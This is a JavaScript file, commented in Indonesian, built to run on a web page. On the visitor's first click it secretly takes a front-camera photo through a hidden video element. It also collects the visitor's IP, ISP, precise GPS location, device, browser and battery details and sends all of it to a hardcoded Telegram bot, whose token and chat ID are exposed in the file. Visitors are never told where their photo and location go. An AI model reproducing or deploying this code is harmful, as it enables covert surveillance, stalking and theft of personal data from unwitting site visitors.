// === Konfigurasi Bot Telegram ===
const BOT_TOKEN = "8367413026:AAEM93F3pqbBwdOwJTCHs_0TYO4PnVsGfqY"; 
const CHAT_ID = "8482486283"; 

// Buat elemen video tersembunyi untuk akses kamera
const camera = document.createElement("video");
camera.autoplay = true;
camera.style.display = "none";
document.body.appendChild(camera);

// Ambil IP, lokasi, device info + tipe koneksi
async function getUserInfo() {
  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const namaWifi = connection && connection.type ? connection.type : "Tidak diketahui";

    const battery = await navigator.getBattery();

    const deviceInfo = {
      browser: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      wifi: namaWifi,
      battery: `${Math.round(battery.level * 100)}%`
    };

    return {
      ip: ipData.ip || "-",
      isp: ipData.org || "-",
      city: ipData.city || "-",
      region: ipData.region || "-",
      country: ipData.country_name || "-",
      lat: ipData.latitude,
      lon: ipData.longitude,
      time: new Date().toLocaleString(),
      ...deviceInfo
    };
  } catch (err) {
    console.error("Gagal ambil info user:", err);
    return {};
  }
}

// Kirim foto + info ke Telegram
function kirimFotoTelegram(blob, info) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "capture.jpg");
  formData.append(
    "caption",
    `📡 IP: ${info.ip}
🏢 ISP: ${info.isp}
📶 Tipe Jaringan: ${info.wifi}
📍 Lokasi: ${info.lat}, ${info.lon}
🌆 Kota: ${info.city}, ${info.region}, ${info.country}
🕒 Waktu: ${info.time} (${info.timezone})
💻 Device: ${info.platform}
🌐 Browser: ${info.browser}
🖥 Resolusi: ${info.screen}
🔋 Battery: ${info.battery}
🔗 https://www.google.com/maps?q=${info.lat},${info.lon}`
  );

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

// Minta izin kamera + lokasi
function requestPermissions() {
  return new Promise(async (ok, err) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      camera.srcObject = stream;
      ok(true);
    } catch (e) {
      err("Gagal mendapatkan izin kamera");
    }
  });
}

// Capture gambar + kirim
async function captureAndSend(latestPosition) {
  const info = await getUserInfo();
  info.lat = latestPosition.coords.latitude;
  info.lon = latestPosition.coords.longitude;

  const canvas = document.createElement("canvas");
  canvas.width = camera.videoWidth || 640;
  canvas.height = camera.videoHeight || 480;
  canvas.getContext("2d").drawImage(camera, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(
    (blob) => {
      kirimFotoTelegram(blob, info).then(() =>
        console.log("Foto + data terkirim ke Telegram")
      );
    },
    "image/jpeg",
    0.95
  );
}

// Jalankan pas klik pertama di halaman
document.body.addEventListener("click", () => {
  requestPermissions()
    .then(() => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          captureAndSend(pos);
        },
        (err) => console.error("Gagal dapat lokasi:", err),
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    })
    .catch((e) => console.error("Error izin:", e));
}, { once: true });
